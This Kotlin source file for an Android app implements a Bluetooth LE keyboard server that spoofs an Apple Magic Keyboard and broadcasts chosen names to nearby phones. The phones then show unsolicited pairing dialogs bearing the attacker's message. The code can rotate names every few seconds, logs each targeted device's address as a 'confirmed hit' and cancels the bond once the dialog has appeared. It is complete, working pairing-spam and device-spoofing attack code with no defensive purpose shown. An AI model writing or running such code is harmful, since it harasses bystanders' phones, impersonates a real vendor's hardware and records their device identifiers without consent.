package com.sunfeld.smsgateway

import android.bluetooth.*
import android.bluetooth.le.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.ParcelUuid
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.util.UUID

/**
 * BLE HOGP (HID Over GATT Profile) Keyboard Server.
 *
 * This is the REAL mechanism that makes iPhones and Android phones show
 * "Keyboard wants to pair" dialogs. Unlike the Classic BT HidPairingSpammer,
 * this works over BLE which both iOS and Android actively scan for.
 *
 * Architecture:
 * 1. BluetoothLeAdvertiser — broadcasts BLE advertisement with HID service UUID
 *    and device name (the message we want the target to see)
 * 2. BluetoothGattServer — serves the actual HID service with required
 *    characteristics (Report Map, HID Information, Report, Protocol Mode)
 * 3. When a phone sees the ad + probes the GATT server and finds a real HID
 *    keyboard, it shows a system-level pairing dialog with our device name
 * 4. We detect the pairing attempt, log it as confirmed, then optionally
 *    tear down and re-advertise with a new name
 *
 * Required characteristics for HID Service (0x1812):
 * - HID Information (0x2A4A): version, country code, flags
 * - Report Map (0x2A4B): the USB HID descriptor (keyboard layout)
 * - Report (0x2A4D): the actual HID report data (key presses)
 * - Protocol Mode (0x2A4E): boot protocol vs report protocol
 *
 * Plus required GATT services:
 * - Device Information (0x180A): manufacturer, model, etc.
 * - Battery Service (0x180F): fake battery level (makes it look real)
 */
class BleHidKeyboardServer {

    companion object {
        private const val TAG = "BleHidKeyboard"

        // ---- Standard BLE UUIDs ----
        // HID Service
        val HID_SERVICE_UUID: UUID = UUID.fromString("00001812-0000-1000-8000-00805f9b34fb")
        // Device Information Service
        val DIS_UUID: UUID = UUID.fromString("0000180A-0000-1000-8000-00805f9b34fb")
        // Battery Service
        val BATTERY_UUID: UUID = UUID.fromString("0000180F-0000-1000-8000-00805f9b34fb")
        // Generic Access
        val GAP_UUID: UUID = UUID.fromString("00001800-0000-1000-8000-00805f9b34fb")

        // HID characteristics
        val HID_INFORMATION_UUID: UUID = UUID.fromString("00002A4A-0000-1000-8000-00805f9b34fb")
        val REPORT_MAP_UUID: UUID = UUID.fromString("00002A4B-0000-1000-8000-00805f9b34fb")
        val HID_CONTROL_POINT_UUID: UUID = UUID.fromString("00002A4C-0000-1000-8000-00805f9b34fb")
        val REPORT_UUID: UUID = UUID.fromString("00002A4D-0000-1000-8000-00805f9b34fb")
        val PROTOCOL_MODE_UUID: UUID = UUID.fromString("00002A4E-0000-1000-8000-00805f9b34fb")

        // Descriptors
        val CLIENT_CONFIG_UUID: UUID = UUID.fromString("00002902-0000-1000-8000-00805f9b34fb")
        val REPORT_REFERENCE_UUID: UUID = UUID.fromString("00002908-0000-1000-8000-00805f9b34fb")

        // Device Information characteristics
        val MANUFACTURER_NAME_UUID: UUID = UUID.fromString("00002A29-0000-1000-8000-00805f9b34fb")
        val MODEL_NUMBER_UUID: UUID = UUID.fromString("00002A24-0000-1000-8000-00805f9b34fb")
        val PNP_ID_UUID: UUID = UUID.fromString("00002A50-0000-1000-8000-00805f9b34fb")

        // Battery characteristic
        val BATTERY_LEVEL_UUID: UUID = UUID.fromString("00002A19-0000-1000-8000-00805f9b34fb")

        // Device Name (GAP)
        val DEVICE_NAME_UUID: UUID = UUID.fromString("00002A00-0000-1000-8000-00805f9b34fb")
        val APPEARANCE_UUID: UUID = UUID.fromString("00002A01-0000-1000-8000-00805f9b34fb")

        // Appearance value for keyboard (0x03C1)
        private const val APPEARANCE_KEYBOARD = 0x03C1

        // HID Information: USB HID spec 1.11, no country, normally connectable + boot device
        private val HID_INFORMATION_DATA = byteArrayOf(
            0x11, 0x01,  // bcdHID: HID spec version 1.11
            0x00,        // bCountryCode: not localized
            0x02         // Flags: normally connectable (bit 1)
        )

        // Protocol mode: Report Protocol (1) — more feature-rich than Boot Protocol (0)
        private const val PROTOCOL_MODE_REPORT: Byte = 0x01

        // How long to advertise before rotating name (if in rotation mode)
        private const val AD_DWELL_MS = 3000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // --- Public state ---
    private val _confirmedHits = MutableStateFlow(0)
    val confirmedHits: StateFlow<Int> = _confirmedHits.asStateFlow()

    private val _connectionCount = MutableStateFlow(0)
    val connectionCount: StateFlow<Int> = _connectionCount.asStateFlow()

    private val _isRunning = MutableStateFlow(false)
    val isRunning: StateFlow<Boolean> = _isRunning.asStateFlow()

    private val _currentName = MutableStateFlow<String?>(null)
    val currentName: StateFlow<String?> = _currentName.asStateFlow()

    private val _lastEvent = MutableStateFlow<String?>(null)
    val lastEvent: StateFlow<String?> = _lastEvent.asStateFlow()

    private val _lastError = MutableStateFlow<String?>(null)
    val lastError: StateFlow<String?> = _lastError.asStateFlow()

    // --- Internal state ---
    private var adapter: BluetoothAdapter? = null
    private var advertiser: BluetoothLeAdvertiser? = null
    private var gattServer: BluetoothGattServer? = null
    private var originalAdapterName: String? = null
    private var currentAdCallback: AdvertiseCallback? = null
    private var nameRotateJob: Job? = null
    private var pairingReceiver: BroadcastReceiver? = null
    private var appContext: Context? = null

    // Track connected devices
    private val connectedDevices = mutableSetOf<String>()
    // Track confirmed pairing requests (real evidence target saw the dialog)
    private val confirmedAddresses = mutableSetOf<String>()

    // Current advertised device name — stored for GATT reads
    @Volatile private var advertisedName: String = "Keyboard"

    // The GATT server callbacks — this is where we see REAL connections
    private val gattCallback = object : BluetoothGattServerCallback() {

        override fun onConnectionStateChange(device: BluetoothDevice, status: Int, newState: Int) {
            val stateName = when (newState) {
                BluetoothProfile.STATE_CONNECTED -> "CONNECTED"
                BluetoothProfile.STATE_DISCONNECTED -> "DISCONNECTED"
                else -> "STATE_$newState"
            }
            val name = try { device.name ?: device.address } catch (_: SecurityException) { device.address }
            Log.d(TAG, "GATT connection: $name ($stateName, status=$status)")

            if (newState == BluetoothProfile.STATE_CONNECTED) {
                connectedDevices.add(device.address)
                _connectionCount.value = connectedDevices.size
                _lastEvent.value = "GATT connected: $name"
                CrashLogger.log(appContext!!, TAG, "GATT CONNECTED: $name (${device.address}) — target is probing our HID service")
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                connectedDevices.remove(device.address)
                _connectionCount.value = connectedDevices.size
            }
        }

        override fun onCharacteristicReadRequest(
            device: BluetoothDevice, requestId: Int, offset: Int,
            characteristic: BluetoothGattCharacteristic
        ) {
            val uuid = characteristic.uuid
            val name = try { device.name ?: device.address } catch (_: SecurityException) { device.address }
            Log.d(TAG, "Read request from $name: ${uuidName(uuid)} offset=$offset")

            val value = when (uuid) {
                REPORT_MAP_UUID -> HidKeyReport.KEYBOARD_DESCRIPTOR
                HID_INFORMATION_UUID -> HID_INFORMATION_DATA
                PROTOCOL_MODE_UUID -> byteArrayOf(PROTOCOL_MODE_REPORT)
                REPORT_UUID -> ByteArray(8) // empty report (no keys pressed)
                MANUFACTURER_NAME_UUID -> advertisedName.toByteArray()
                MODEL_NUMBER_UUID -> "BT Keyboard".toByteArray()
                PNP_ID_UUID -> byteArrayOf(
                    0x02,                    // Vendor ID source: USB Implementer's Forum
                    0x4C, 0x00,              // Vendor ID: Apple (0x004C) — looks legit
                    0x67, 0x02,              // Product ID: 0x0267 (Magic Keyboard)
                    0x01, 0x00               // Product version: 1.0
                )
                BATTERY_LEVEL_UUID -> byteArrayOf(85.toByte()) // 85% — looks real
                DEVICE_NAME_UUID -> advertisedName.toByteArray()
                APPEARANCE_UUID -> byteArrayOf(
                    (APPEARANCE_KEYBOARD and 0xFF).toByte(),
                    ((APPEARANCE_KEYBOARD shr 8) and 0xFF).toByte()
                )
                else -> {
                    Log.d(TAG, "Unknown characteristic read: $uuid")
                    byteArrayOf()
                }
            }

            // Handle offset for multi-read
            val response = if (offset >= value.size) byteArrayOf()
                           else value.copyOfRange(offset, value.size)

            gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, response)

            // If they're reading the Report Map, they're deep in HID discovery —
            // this means the OS is seriously considering showing a pairing dialog
            if (uuid == REPORT_MAP_UUID) {
                _lastEvent.value = "HID probe from $name — reading keyboard descriptor"
                CrashLogger.log(appContext!!, TAG, "HID PROBE: $name reading Report Map — pairing dialog imminent")
            }
        }

        override fun onDescriptorReadRequest(
            device: BluetoothDevice, requestId: Int, offset: Int,
            descriptor: BluetoothGattDescriptor
        ) {
            val value = when (descriptor.uuid) {
                CLIENT_CONFIG_UUID -> BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE
                REPORT_REFERENCE_UUID -> byteArrayOf(0x00, 0x01) // Report ID 0, Input type
                else -> byteArrayOf()
            }
            gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, value)
        }

        override fun onDescriptorWriteRequest(
            device: BluetoothDevice, requestId: Int,
            descriptor: BluetoothGattDescriptor, preparedWrite: Boolean,
            responseNeeded: Boolean, offset: Int, value: ByteArray
        ) {
            // Client enabling notifications on the Report characteristic
            if (descriptor.uuid == CLIENT_CONFIG_UUID) {
                val name = try { device.name ?: device.address } catch (_: SecurityException) { device.address }
                Log.d(TAG, "Notifications enabled by $name — they want keyboard input!")
                _lastEvent.value = "Notifications enabled by $name"
            }
            if (responseNeeded) {
                gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, value)
            }
        }

        override fun onCharacteristicWriteRequest(
            device: BluetoothDevice, requestId: Int,
            characteristic: BluetoothGattCharacteristic, preparedWrite: Boolean,
            responseNeeded: Boolean, offset: Int, value: ByteArray
        ) {
            // HID Control Point write (suspend/exit suspend)
            if (responseNeeded) {
                gattServer?.sendResponse(device, requestId, BluetoothGatt.GATT_SUCCESS, offset, value)
            }
        }
    }

    /**
     * Start the BLE HID keyboard server.
     *
     * @param context Android context
     * @param deviceName The name targets will see in the pairing dialog
     * @param rotateNames If true, cycles through keyboard brand names
     */
    fun start(context: Context, deviceName: String, rotateNames: Boolean = false) {
        if (_isRunning.value) return

        appContext = context.applicationContext
        _isRunning.value = true
        _confirmedHits.value = 0
        _connectionCount.value = 0
        _lastError.value = null
        _lastEvent.value = null
        connectedDevices.clear()
        confirmedAddresses.clear()
        advertisedName = deviceName

        val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
        adapter = btManager?.adapter

        if (adapter == null || adapter?.isEnabled != true) {
            _lastError.value = "Bluetooth not available"
            _isRunning.value = false
            return
        }

        // Save and set adapter name
        try {
            originalAdapterName = adapter?.name
            adapter?.setName(deviceName)
            _currentName.value = deviceName
        } catch (e: SecurityException) {
            _lastError.value = "Cannot set Bluetooth name"
            _isRunning.value = false
            return
        }

        // Register pairing request receiver — this is our CONFIRMATION signal
        registerPairingReceiver(context)

        // Step 1: Set up GATT server with HID service
        if (!setupGattServer(context, btManager)) {
            _lastError.value = "Failed to set up GATT server"
            _isRunning.value = false
            return
        }

        // Step 2: Start BLE advertising
        startAdvertising(deviceName)

        // Step 3: Optional name rotation
        if (rotateNames) {
            val names = DeviceProfiles.ALL.map { it.sdpName }
            nameRotateJob = scope.launch {
                var index = 0
                while (isActive) {
                    delay(AD_DWELL_MS)
                    val name = names[index % names.size]
                    index++
                    advertisedName = name
                    try { adapter?.setName(name) } catch (_: SecurityException) { }
                    _currentName.value = name
                    // Restart advertising with new name
                    stopAdvertising()
                    delay(100)
                    startAdvertising(name)
                }
            }
        }

        CrashLogger.log(context, TAG, "BLE HID Keyboard Server started: name='$deviceName' rotate=$rotateNames")
        _lastEvent.value = "Server started as '$deviceName'"
    }

    private fun setupGattServer(context: Context, btManager: BluetoothManager?): Boolean {
        try {
            gattServer = btManager?.openGattServer(context, gattCallback)
            if (gattServer == null) {
                Log.e(TAG, "openGattServer returned null")
                return false
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException opening GATT server", e)
            return false
        }

        // === HID Service (0x1812) ===
        val hidService = BluetoothGattService(HID_SERVICE_UUID, BluetoothGattService.SERVICE_TYPE_PRIMARY)

        // HID Information (read-only)
        val hidInfo = BluetoothGattCharacteristic(
            HID_INFORMATION_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ,
            BluetoothGattCharacteristic.PERMISSION_READ_ENCRYPTED
        )
        hidService.addCharacteristic(hidInfo)

        // Report Map (read-only) — the keyboard descriptor
        val reportMap = BluetoothGattCharacteristic(
            REPORT_MAP_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ,
            BluetoothGattCharacteristic.PERMISSION_READ_ENCRYPTED
        )
        hidService.addCharacteristic(reportMap)

        // HID Control Point (write-no-response)
        val controlPoint = BluetoothGattCharacteristic(
            HID_CONTROL_POINT_UUID,
            BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE,
            BluetoothGattCharacteristic.PERMISSION_WRITE_ENCRYPTED
        )
        hidService.addCharacteristic(controlPoint)

        // Report (read + notify) — where key reports go
        val report = BluetoothGattCharacteristic(
            REPORT_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ or
                BluetoothGattCharacteristic.PROPERTY_NOTIFY,
            BluetoothGattCharacteristic.PERMISSION_READ_ENCRYPTED
        )
        // Client Characteristic Configuration Descriptor (for notifications)
        val cccd = BluetoothGattDescriptor(
            CLIENT_CONFIG_UUID,
            BluetoothGattDescriptor.PERMISSION_READ_ENCRYPTED or
                BluetoothGattDescriptor.PERMISSION_WRITE_ENCRYPTED
        )
        report.addDescriptor(cccd)
        // Report Reference Descriptor
        val reportRef = BluetoothGattDescriptor(
            REPORT_REFERENCE_UUID,
            BluetoothGattDescriptor.PERMISSION_READ_ENCRYPTED
        )
        report.addDescriptor(reportRef)
        hidService.addCharacteristic(report)

        // Protocol Mode (read + write-no-response)
        val protocolMode = BluetoothGattCharacteristic(
            PROTOCOL_MODE_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ or
                BluetoothGattCharacteristic.PROPERTY_WRITE_NO_RESPONSE,
            BluetoothGattCharacteristic.PERMISSION_READ_ENCRYPTED or
                BluetoothGattCharacteristic.PERMISSION_WRITE_ENCRYPTED
        )
        hidService.addCharacteristic(protocolMode)

        try {
            gattServer?.addService(hidService)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to add HID service", e)
            return false
        }

        // Small delay between service additions
        Thread.sleep(200)

        // === Device Information Service (0x180A) ===
        val disService = BluetoothGattService(DIS_UUID, BluetoothGattService.SERVICE_TYPE_PRIMARY)

        val manufacturer = BluetoothGattCharacteristic(
            MANUFACTURER_NAME_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ,
            BluetoothGattCharacteristic.PERMISSION_READ
        )
        disService.addCharacteristic(manufacturer)

        val modelNumber = BluetoothGattCharacteristic(
            MODEL_NUMBER_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ,
            BluetoothGattCharacteristic.PERMISSION_READ
        )
        disService.addCharacteristic(modelNumber)

        val pnpId = BluetoothGattCharacteristic(
            PNP_ID_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ,
            BluetoothGattCharacteristic.PERMISSION_READ
        )
        disService.addCharacteristic(pnpId)

        try {
            gattServer?.addService(disService)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to add DIS service", e)
            // Not fatal — HID can work without DIS
        }

        Thread.sleep(200)

        // === Battery Service (0x180F) ===
        val batteryService = BluetoothGattService(BATTERY_UUID, BluetoothGattService.SERVICE_TYPE_PRIMARY)

        val batteryLevel = BluetoothGattCharacteristic(
            BATTERY_LEVEL_UUID,
            BluetoothGattCharacteristic.PROPERTY_READ or
                BluetoothGattCharacteristic.PROPERTY_NOTIFY,
            BluetoothGattCharacteristic.PERMISSION_READ
        )
        val batteryCccd = BluetoothGattDescriptor(
            CLIENT_CONFIG_UUID,
            BluetoothGattDescriptor.PERMISSION_READ or BluetoothGattDescriptor.PERMISSION_WRITE
        )
        batteryLevel.addDescriptor(batteryCccd)
        batteryService.addCharacteristic(batteryLevel)

        try {
            gattServer?.addService(batteryService)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to add Battery service", e)
        }

        Log.d(TAG, "GATT server set up: HID + DIS + Battery services")
        return true
    }

    private fun startAdvertising(name: String) {
        advertiser = adapter?.bluetoothLeAdvertiser
        if (advertiser == null) {
            Log.e(TAG, "BLE advertiser not available")
            _lastError.value = "BLE advertising not supported"
            return
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(true)  // MUST be connectable for GATT
            .setTimeout(0)
            .build()

        // Advertisement data — include HID service UUID so phones know it's a keyboard
        val advertiseData = AdvertiseData.Builder()
            .setIncludeDeviceName(true)
            .setIncludeTxPowerLevel(true)
            .addServiceUuid(ParcelUuid(HID_SERVICE_UUID))
            .build()

        // Scan response — additional data phones can request
        val scanResponse = AdvertiseData.Builder()
            .setIncludeDeviceName(true)
            .addServiceUuid(ParcelUuid(GAP_UUID))
            .build()

        val callback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings) {
                Log.d(TAG, "BLE advertising started as '$name'")
            }

            override fun onStartFailure(errorCode: Int) {
                val err = when (errorCode) {
                    ADVERTISE_FAILED_DATA_TOO_LARGE -> "DATA_TOO_LARGE"
                    ADVERTISE_FAILED_TOO_MANY_ADVERTISERS -> "TOO_MANY_ADVERTISERS"
                    ADVERTISE_FAILED_ALREADY_STARTED -> "ALREADY_STARTED"
                    ADVERTISE_FAILED_INTERNAL_ERROR -> "INTERNAL_ERROR"
                    ADVERTISE_FAILED_FEATURE_UNSUPPORTED -> "UNSUPPORTED"
                    else -> "UNKNOWN($errorCode)"
                }
                Log.e(TAG, "BLE advertising failed: $err")
                _lastError.value = "BLE ad failed: $err"
            }
        }
        currentAdCallback = callback

        try {
            advertiser?.startAdvertising(settings, advertiseData, scanResponse, callback)
        } catch (e: Exception) {
            Log.e(TAG, "startAdvertising failed", e)
            _lastError.value = "Advertising failed: ${e.message}"
        }
    }

    private fun stopAdvertising() {
        currentAdCallback?.let { cb ->
            try { advertiser?.stopAdvertising(cb) } catch (_: Exception) { }
        }
        currentAdCallback = null
    }

    private fun registerPairingReceiver(context: Context) {
        pairingReceiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                when (intent.action) {
                    BluetoothDevice.ACTION_PAIRING_REQUEST -> {
                        val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                        }
                        val variant = intent.getIntExtra(BluetoothDevice.EXTRA_PAIRING_VARIANT, -1)
                        val variantName = when (variant) {
                            0 -> "PIN_ENTRY"
                            1 -> "PASSKEY"
                            2 -> "NUMERIC_COMPARISON"
                            3 -> "CONSENT"
                            else -> "VARIANT_$variant"
                        }
                        val addr = device?.address ?: "unknown"
                        val name = try { device?.name ?: addr } catch (_: SecurityException) { addr }

                        Log.d(TAG, "*** PAIRING CONFIRMED: $name ($addr) variant=$variantName ***")
                        _lastEvent.value = "CONFIRMED: $name ($variantName)"

                        if (addr !in confirmedAddresses) {
                            confirmedAddresses.add(addr)
                            _confirmedHits.value = confirmedAddresses.size
                        }

                        CrashLogger.log(appContext!!, TAG,
                            "PAIRING CONFIRMED: device=$name addr=$addr variant=$variantName name_shown='$advertisedName'")

                        // Cancel the pairing — we got what we wanted (the dialog was shown)
                        device?.let { cancelBond(it) }
                    }
                    BluetoothDevice.ACTION_BOND_STATE_CHANGED -> {
                        val device = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE, BluetoothDevice::class.java)
                        } else {
                            @Suppress("DEPRECATION")
                            intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE)
                        }
                        val state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, BluetoothDevice.BOND_NONE)
                        val prev = intent.getIntExtra(BluetoothDevice.EXTRA_PREVIOUS_BOND_STATE, BluetoothDevice.BOND_NONE)
                        val name = try { device?.name ?: device?.address } catch (_: SecurityException) { device?.address }
                        Log.d(TAG, "Bond: $name $prev -> $state")
                    }
                }
            }
        }

        val filter = IntentFilter().apply {
            addAction(BluetoothDevice.ACTION_PAIRING_REQUEST)
            addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED)
            priority = IntentFilter.SYSTEM_HIGH_PRIORITY
        }
        try {
            ContextCompat.registerReceiver(
                context, pairingReceiver!!, filter, ContextCompat.RECEIVER_EXPORTED
            )
        } catch (e: Exception) {
            Log.w(TAG, "Failed to register receiver: ${e.message}")
        }
    }

    private fun cancelBond(device: BluetoothDevice) {
        try {
            device.javaClass.getMethod("cancelBondProcess").invoke(device)
        } catch (_: Exception) { }
        try {
            device.javaClass.getMethod("removeBond").invoke(device)
        } catch (_: Exception) { }
    }

    fun stop(context: Context) {
        Log.d(TAG, "Stopping BLE HID Keyboard Server")
        _isRunning.value = false
        nameRotateJob?.cancel()

        // Stop advertising
        stopAdvertising()

        // Close GATT server
        try {
            // Disconnect all connected devices
            for (addr in connectedDevices.toList()) {
                try {
                    val btManager = context.getSystemService(Context.BLUETOOTH_SERVICE) as? BluetoothManager
                    val adapter = btManager?.adapter
                    val device = adapter?.getRemoteDevice(addr)
                    if (device != null) {
                        gattServer?.cancelConnection(device)
                        cancelBond(device)
                    }
                } catch (_: Exception) { }
            }
            gattServer?.clearServices()
            gattServer?.close()
        } catch (_: Exception) { }
        gattServer = null

        // Restore adapter name
        originalAdapterName?.let { name ->
            try { adapter?.setName(name) } catch (_: SecurityException) { }
        }

        // Unregister receiver
        pairingReceiver?.let {
            try { context.unregisterReceiver(it) } catch (_: Exception) { }
        }
        pairingReceiver = null

        connectedDevices.clear()
        _currentName.value = null

        CrashLogger.log(context, TAG, "BLE HID Server stopped: ${_confirmedHits.value} confirmed pairing dialogs, ${_connectionCount.value} GATT connections")
    }

    private fun uuidName(uuid: UUID): String = when (uuid) {
        REPORT_MAP_UUID -> "Report Map"
        HID_INFORMATION_UUID -> "HID Information"
        REPORT_UUID -> "Report"
        PROTOCOL_MODE_UUID -> "Protocol Mode"
        HID_CONTROL_POINT_UUID -> "Control Point"
        MANUFACTURER_NAME_UUID -> "Manufacturer"
        MODEL_NUMBER_UUID -> "Model Number"
        PNP_ID_UUID -> "PnP ID"
        BATTERY_LEVEL_UUID -> "Battery Level"
        DEVICE_NAME_UUID -> "Device Name"
        APPEARANCE_UUID -> "Appearance"
        else -> uuid.toString().take(8)
    }
}
